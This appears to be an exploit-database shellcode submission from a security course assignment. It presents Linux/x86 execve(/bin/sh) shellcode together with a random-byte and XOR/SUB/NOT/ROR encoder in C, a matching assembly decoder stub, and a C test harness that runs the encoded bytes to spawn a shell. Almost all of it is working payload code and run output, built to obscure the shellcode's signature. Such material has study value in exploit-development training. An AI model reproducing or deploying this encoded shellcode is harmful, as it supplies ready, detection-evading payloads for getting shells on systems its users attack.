# Title: Linux/x86 - Random Bytes Encoder + XOR/SUB/NOT/ROR execve(/bin/sh) Shellcode (114)
# Author: Xenofon Vassilakopoulos
# Date: 2020-01-01
# Tested on: Linux kali 5.3.0-kali2-686-pae #1 SMP Debian 5.3.9-3kali1 (2019-11-20) i686 GNU/Linux
# Architecture: i686 GNU/Linux
# Shellcode Length: 114 bytes
# SLAE-ID: SLAE - 1314
# Description: Linux/x86 encoding of random bytes + XOR/SUB/NOT/ROR and also decodes ROL/NOT/ADD/XOR execve(/bin/sh) shellcode


---------------------- execve-stack /bin/sh --------------------------------

global _start
section .text
_start:
        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push eax
        mov edx, esp
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80

----------------------- Original Shellcode ---------------------------------


"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"


----------- Decoder ROL/NOT/ADD/XOR + Removing inserted random bytes -------


global _start

section .text

_start:
        jmp short call_shellcode
decoder:
        pop esi
        push esi
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx
        mov dl, len
rotate:
        ;; apply the decoding scheme
        rol byte [esi], 4
        not byte [esi]
        add byte [esi], 2
        xor byte [esi], 0x2c
        inc esi
        cmp cl, dl
        je  init
        inc cl
        jmp short rotate

init:
        pop esi
        lea edi, [esi +1]
        xor eax, eax
        mov al, 1
        xor ecx, ecx

decode:
        cmp cl, dl
        je EncodedShellcode
        mov bl, byte [esi + eax + 1]
        mov byte [edi], bl
        inc edi
        inc cl
        add al, 2
        jmp short decode

call_shellcode:
        call decoder
        EncodedShellcode: db 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3
        len equ $-EncodedShellcode


---------  Encoder - Random Bytes Insertion + XOR/SUB/NOT/ROR  ---------------

xenofon@slae:~/Documents/Assignment4$ gcc -o encoder encoder.c
xenofon@slae:~/Documents/Assignment4$ ./encoder


Shellcode:

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

Shellcode Length 25


Decoded Shellcode:

0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80,

Encoded shellcode

0x4e,0x70,0x51,0x61,0x58,0xf4,0xdb,0xe1,0xef,0xef,0xef,0x6a,0x2a,0x41,0xdb,0x4c,0xdb,0x20,0xef,0xbf,0x3b,0x78,0xcb,0x77,0xfb,0x57,0xc5,0x90,0x23,0x62,0x58,0xf0,0xc5,0xe1,0x33,0xe5,0x28,0x9d,0xc5,0x3d,0x43,0xf6,0x56,0x29,0xad,0x29,0x02,0x57,0x55,0x34,

Encoded Shellcode Length 50


xenofon@slae:~/Documents/Assignment4$ cat encoder.c

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define DEC 0x2 // the value that will be used to substract every byte
#define XORVAL 0x2c // the value that will be used to xor with every byte

// execve stack shellcode /bin/sh
unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

void main()
{
        int rot = 4; //right rotation 4 bits
        printf("\n\nShellcode:\n\n");
        int o;
        for (o=0; o<strlen(shellcode); o++) {
                printf("\\x%02x", shellcode[o]);
        }
        printf("\n\nShellcode Length %d\n",sizeof(shellcode)-1);
        printf("\n\nDecoded Shellcode:\n\n");
        o=0;
        for (o; o<strlen(shellcode); o++) {
                printf("0x%02x,", shellcode[o]);
        }
        printf("\n");
        int i;
        unsigned char *buffer = (char*)malloc(sizeof(shellcode)*2);
        srand((unsigned int)time(NULL));
        unsigned char *shellcode2=(char*)malloc(sizeof(shellcode)*2);
        // placeholder to copy the random bytes using rand
        unsigned char shellcode3[] = "\xbb";
        int l = 0;
        int k = 0;
        int j;
        // random byte insertion into even location
        for (i=0; i<(strlen(shellcode)*2); i++) {
                // generate random bytes
                buffer[i] = rand() & 0xff;
                memcpy(&shellcode3[0],(unsigned char*)&buffer[i],sizeof(buffer[i]));
                k = i % 2;
                if (k == 0)
                {
                        shellcode2[i] = shellcode[l];
                        l++;
                }
                else
                {
                        shellcode2[i] = shellcode3[0];
                }
        }
        // apply the encoding scheme
        for (i=0; i<strlen(shellcode2); i++) {
				// XOR every byte with 0x2c
                shellcode2[i] = shellcode2[i] ^ XORVAL;
                // subtract every byte by 2
                shellcode2[i] = shellcode2[i] - DEC;
                // one's complement negation
                shellcode2[i] = ~shellcode2[i];
                // perform the ROR method
                shellcode2[i] = (shellcode2[i] << rot) | (shellcode2[i] >> sizeof(shellcode2[i])*(8-rot));
        }
        // print encoded shellcode
        printf("\nEncoded shellcode\n\n");
        i=0;
        for (i; i<strlen(shellcode2); i++) {
                printf("0x%02x,", shellcode2[i]);
        }
        printf("\n\nEncoded Shellcode Length %d\n",strlen(shellcode2));
        free(shellcode2);
        free(buffer);
        printf("\n\n");
 }


-----------------------------------  Shellcode -------------------------------------

xenofon@slae:~/Documents/Assignment4$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
xenofon@slae:~/Documents/Assignment4$ ./shellcode
Shellcode Length:  117
$ whoami
xenofon


xenofon@slae:~/Documents/Assignment4$ cat shellcode.c
#include <stdio.h>
#include <string.h>

unsigned char code[] = \

        "\xeb\x3c\x5e\x56\x31\xdb\x31\xc9\x31\xd2\xb2\x32\xc0\x06"
        "\x04\xf6\x16\x80\x06\x02\x80\x36\x2c\x46\x38\xd1\x74\x04"
        "\xfe\xc1\xeb\xec\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xc9"
        "\x8a\x1c\x06\x38\xd1\x74\x12\x8a\x5c\x06\x01\x88\x1f\x47"
        "\xfe\xc1\x04\x02\xeb\xec\xe8\xbf\xff\xff\xff\x4e\xd1\x51"
        "\xb4\x58\x37\xdb\x55\xef\x3d\xef\xbd\x2a\x59\xdb\x81\xdb"
        "\x56\xef\xae\x3b\x1a\xcb\xfa\xfb\x43\xc5\x49\x23\x12\x58"
        "\xd2\xc5\xee\x33\x82\x28\x49\xc5\xc3\x43\x30\x56\xcb\xad"
        "\xe1\x02\x8b\x55\x84";

int main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}